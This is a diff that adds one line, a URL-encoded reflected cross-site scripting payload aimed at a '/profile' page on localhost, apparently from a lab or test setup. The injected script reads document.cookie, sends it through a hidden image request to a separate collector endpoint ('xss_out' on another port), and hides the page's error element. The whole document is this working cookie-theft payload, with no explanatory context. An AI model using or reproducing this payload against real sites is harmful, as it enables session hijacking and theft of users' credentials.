@@ -1,0 +1,1 @@
+http://localhost:8080/profile/%3Cscript%3Evar%20img%20%3D%20new%20Image()%3Bimg.src%3D%27http%3A%2F%2Flocalhost%3A8081%2Fxss_out%3Fstolen_cookie%3D%27%2BencodeURIComponent(document.cookie)%3Bimg.style.display%3D%27none%27%3Bdocument.body.appendChild(img)%3Bdocument.querySelector(%27.error%27).style.display%3D%27none%27%3B%3C%2Fscript%3E
